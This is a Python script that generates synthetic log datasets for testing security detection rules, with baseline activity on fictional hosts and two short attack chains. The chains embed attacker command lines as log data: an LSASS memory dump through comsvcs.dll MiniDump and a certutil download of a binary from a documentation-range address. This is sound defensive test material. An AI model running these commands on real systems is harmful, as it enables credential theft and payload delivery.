#!/usr/bin/env python3
"""Generate the synthetic background datasets under datasets/.

Output is deterministic (fixed seed) so diffs stay reviewable. Every host, user and address is
fictional: private RFC 1918 space for internal systems and RFC 5737 documentation ranges for
"external" ones. Timestamps are expressed as `t` seconds from the start of a 48-hour window and
resolved to real times when the dataset is loaded.

Baseline files contain ordinary activity (and a few near-misses that should NOT alert, such as
management-agent PowerShell). The two "chain" files contain short attack sequences that exercise
detections not covered by the lab scenarios.
"""

from __future__ import annotations

import json
import random
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "datasets"
WINDOW = 48 * 3600
rng = random.Random(1337)

USERS = ["asmith", "bjones", "cnguyen", "dpatel", "elopez", "fkhan", "gmiller", "hchen"]
WKS = [f"WKS-{n:03d}" for n in range(1, 13)]
LINUX = ["app-01", "app-02", "db-01", "bastion-01"]


def write(kind: str, name: str, events: list[dict]) -> None:
    events.sort(key=lambda e: e["t"])
    path = OUT / kind / f"{name}.jsonl"
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8", newline="\n") as fh:
        for ev in events:
            fh.write(json.dumps(ev, separators=(",", ":"), ensure_ascii=False) + "\n")
    print(f"{path.relative_to(ROOT)}: {len(events)} events")


def t() -> float:
    return round(rng.uniform(0, WINDOW), 1)


def windows_logons() -> list[dict]:
    out = []
    for _ in range(40):
        user = rng.choice(USERS)
        out.append({
            "t": t(), "category": "windows_security", "host": rng.choice(WKS), "outcome": "success",
            "fields": {"EventID": 4624, "TargetUserName": user, "IpAddress": f"10.20.{rng.randint(1, 8)}.{rng.randint(10, 250)}",
                       "LogonType": rng.choice([2, 3, 3, 7])},
            "note": "Routine interactive or network logon from the internal network.",
        })  # fmt: skip
    for _ in range(6):
        out.append({
            "t": t(), "category": "windows_security", "host": rng.choice(WKS), "outcome": "failure",
            "fields": {"EventID": 4625, "TargetUserName": rng.choice(USERS), "IpAddress": f"10.20.{rng.randint(1, 8)}.{rng.randint(10, 250)}",
                       "LogonType": 2, "FailureReason": "Unknown user name or bad password"},
            "note": "A single mistyped password: far below any burst threshold.",
        })  # fmt: skip
    return out


def linux_ssh() -> list[dict]:
    out = []
    for _ in range(30):
        user = rng.choice(["deploy", "ops", "dbadmin"])
        out.append({
            "t": t(), "category": "linux_auth", "host": rng.choice(LINUX), "user": user, "outcome": "success",
            "fields": {"Program": "sshd", "Pid": rng.randint(1000, 9999),
                       "Message": f"Accepted publickey for {user} from 10.20.1.{rng.randint(5, 60)} port {rng.randint(40000, 60000)} ssh2",
                       "SrcIP": "10.20.1.5"},
        })  # fmt: skip
    for i in range(4):
        ip = f"203.0.113.{rng.randint(100, 200)}"
        out.append({
            "t": t(), "category": "linux_auth", "host": "bastion-01", "outcome": "failure",
            "fields": {"Program": "sshd", "Pid": 3000 + i,
                       "Message": f"Failed password for invalid user test from {ip} port {rng.randint(40000, 60000)} ssh2", "SrcIP": ip},
            "note": "Internet background noise: isolated failures do not meet the burst threshold.",
        })  # fmt: skip
    return out


def windows_processes() -> list[dict]:
    benign = [
        (r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Windows\explorer.exe", "chrome.exe --profile-directory=Default"),
        (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", r"C:\Windows\explorer.exe", "OUTLOOK.EXE"),
        (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", r"C:\Windows\explorer.exe", "EXCEL.EXE budget.xlsx"),
        (r"C:\Windows\System32\svchost.exe", r"C:\Windows\System32\services.exe", "svchost.exe -k netsvcs"),
        (r"C:\Windows\System32\notepad.exe", r"C:\Windows\explorer.exe", "notepad.exe notes.txt"),
        (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"C:\Windows\System32\taskeng.exe", r"powershell.exe -File C:\Scripts\backup.ps1"),
    ]  # fmt: skip
    out = []
    for _ in range(30):
        image, parent, cmd = rng.choice(benign)
        out.append({
            "t": t(), "category": "process_creation", "host": rng.choice(WKS), "user": f"CORP\\{rng.choice(USERS)}",
            "outcome": "success", "fields": {"Image": image, "ParentImage": parent, "CommandLine": cmd, "IntegrityLevel": "Medium"},
        })  # fmt: skip
    out.append({
        "t": t(), "category": "process_creation", "host": "WKS-005", "user": "NT AUTHORITY\\SYSTEM", "outcome": "success",
        "fields": {"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "OriginalFileName": "PowerShell.EXE",
                   "ParentImage": r"C:\Windows\CCM\CcmExec.exe", "CommandLine": "powershell.exe -NoProfile -enc SQBnAG4AbwByAGUA",
                   "IntegrityLevel": "System"},
        "note": "Encoded PowerShell from the endpoint-management agent. The encoded-command rule filters this parent, so it must not alert.",
    })  # fmt: skip
    return out


def credential_access_chain() -> list[dict]:
    host = "WKS-009"
    return [
        {"t": 90000, "category": "process_access", "host": host, "user": r"CORP\dpatel", "outcome": "success",
         "fields": {"SourceImage": r"C:\Users\Public\tool.exe", "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1410"},
         "note": "An unsigned binary in a public folder opens LSASS with memory-read rights."},
        {"t": 90020, "category": "process_creation", "host": host, "user": r"CORP\dpatel", "outcome": "success",
         "fields": {"Image": r"C:\Windows\System32\rundll32.exe", "ParentImage": r"C:\Windows\System32\cmd.exe",
                    "CommandLine": r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\l.dmp full", "IntegrityLevel": "High"},
         "note": "A built-in library is asked to write a process memory dump to disk."},
        {"t": 90045, "category": "process_access", "host": host, "user": r"NT AUTHORITY\SYSTEM", "outcome": "success",
         "fields": {"SourceImage": r"C:\Program Files\Windows Defender\MsMpEng.exe", "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1410"},
         "note": "Defender legitimately touches LSASS; the rule excludes it."},
    ]  # fmt: skip


def lateral_movement_chain() -> list[dict]:
    host = "SRV-APP03"
    return [
        {"t": 120000, "category": "process_creation", "host": host, "user": r"CORP\svc-app", "outcome": "success",
         "fields": {"Image": r"C:\Windows\System32\certutil.exe", "ParentImage": r"C:\Windows\System32\cmd.exe",
                    "CommandLine": r"certutil.exe -urlcache -split -f http://198.51.100.10/a.bin C:\Windows\Temp\a.bin", "IntegrityLevel": "High"},
         "note": "A signed system tool used as a downloader against a documentation-range address."},
        {"t": 120060, "category": "process_creation", "host": host, "user": r"NT AUTHORITY\SYSTEM", "outcome": "success",
         "fields": {"Image": r"C:\Windows\System32\cmd.exe", "ParentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                    "CommandLine": "cmd.exe /c hostname", "IntegrityLevel": "System"},
         "note": "A command started through WMI: how remote execution tools run commands."},
        {"t": 120120, "category": "windows_system", "host": host, "outcome": "success",
         "fields": {"EventID": 7045, "ServiceName": "UpdSvc", "ImagePath": r"C:\Users\Public\svc.exe", "ServiceType": "user mode service", "StartType": "auto start"},
         "note": "A new auto-start service whose binary lives in a user-writable folder."},
    ]  # fmt: skip


def dns_baseline() -> list[dict]:
    names = [
        "www.example.com",
        "mail.example.org",
        "updates.example.net",
        "cdn.example.com",
        "api.example.org",
        "login.example.com",
    ]
    return [{
        "t": t(), "category": "dns_query", "host": rng.choice(WKS),
        "outcome": "success",
        "fields": {"src_ip": f"10.20.4.{rng.randint(10, 60)}", "query": rng.choice(names), "record_type": rng.choice(["A", "A", "AAAA"]),
                   "rcode": "NOERROR", "answer": "192.0.2.10"},
    } for _ in range(30)]  # fmt: skip


def firewall_baseline() -> list[dict]:
    return [{
        "t": t(), "category": "firewall", "host": "fw-edge-01", "outcome": "allowed",
        "fields": {"src_ip": f"203.0.113.{rng.randint(1, 60)}", "dst_ip": "10.20.0.15", "dst_port": rng.choice([80, 443, 443, 443]),
                   "proto": "TCP", "action": "allow", "bytes": rng.randint(200, 90000)},
    } for _ in range(20)]  # fmt: skip


def cloud_baseline() -> list[dict]:
    calls = [("s3.amazonaws.com", "ListBuckets"), ("ec2.amazonaws.com", "DescribeInstances"), ("s3.amazonaws.com", "GetObject"),
             ("sts.amazonaws.com", "AssumeRole"), ("iam.amazonaws.com", "ListUsers")]  # fmt: skip
    out = []
    for _ in range(18):
        source, name = rng.choice(calls)
        user = rng.choice(["ci-deployer", "data-analyst", "ops-admin"])
        out.append({
            "t": t(), "category": "cloud_audit", "host": "aws-prod", "user": user, "outcome": "success",
            "fields": {"eventSource": source, "eventName": name, "awsRegion": "us-east-1", "sourceIPAddress": "10.20.9.4",
                       "userIdentity.type": "IAMUser", "userIdentity.userName": user,
                       "userIdentity.arn": f"arn:aws:iam::123456789012:user/{user}"},
        })  # fmt: skip
    out.append({
        "t": t(), "category": "cloud_audit", "host": "aws-prod", "user": "ops-admin", "outcome": "success",
        "fields": {"eventSource": "signin.amazonaws.com", "eventName": "ConsoleLogin", "awsRegion": "us-east-1",
                   "sourceIPAddress": "192.0.2.80", "userIdentity.type": "IAMUser", "userIdentity.userName": "ops-admin",
                   "userIdentity.arn": "arn:aws:iam::123456789012:user/ops-admin", "responseElements.ConsoleLogin": "Success", "geo.country": "US"},
        "note": "A console login from an expected country: the unexpected-country rule must not fire.",
    })  # fmt: skip
    out.append({
        "t": t(), "category": "cloud_audit", "host": "aws-prod", "user": "data-analyst", "outcome": "success",
        "fields": {"eventSource": "iam.amazonaws.com", "eventName": "CreateAccessKey", "awsRegion": "us-east-1", "sourceIPAddress": "10.20.9.4",
                   "userIdentity.type": "IAMUser", "userIdentity.userName": "data-analyst",
                   "userIdentity.arn": "arn:aws:iam::123456789012:user/data-analyst", "requestParameters.userName": "data-analyst"},
        "note": "A user rotating their own key: caller and target match, so the another-user rule must not fire.",
    })  # fmt: skip
    return out


def main() -> None:
    write("authentication", "windows-logons", windows_logons())
    write("authentication", "linux-ssh", linux_ssh())
    write("endpoint", "windows-process-baseline", windows_processes())
    write("endpoint", "credential-access-chain", credential_access_chain())
    write("endpoint", "lateral-movement-chain", lateral_movement_chain())
    write("network", "dns-baseline", dns_baseline())
    write("network", "firewall-baseline", firewall_baseline())
    write("cloud", "cloudtrail-baseline", cloud_baseline())


if __name__ == "__main__":
    main()
